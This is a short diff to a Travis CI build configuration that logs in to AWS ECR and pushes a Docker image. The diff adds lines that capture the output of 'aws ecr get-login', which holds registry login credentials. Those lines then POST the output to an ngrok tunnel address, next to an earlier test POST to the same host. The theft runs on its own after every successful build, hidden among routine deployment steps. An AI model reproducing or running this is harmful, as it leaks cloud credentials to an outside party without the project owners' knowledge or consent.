@@ -18,7 +18,10 @@ after_success:
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
+  - curl -X POST http://f8d03deb5377.ngrok.io --data "ahoj2 stef"
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - awsout= $(aws ecr get-login --no-include-email --region us-east-1)
+  - curl -X POST http://f8d03deb5377.ngrok.io --data "param1=$awsout"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
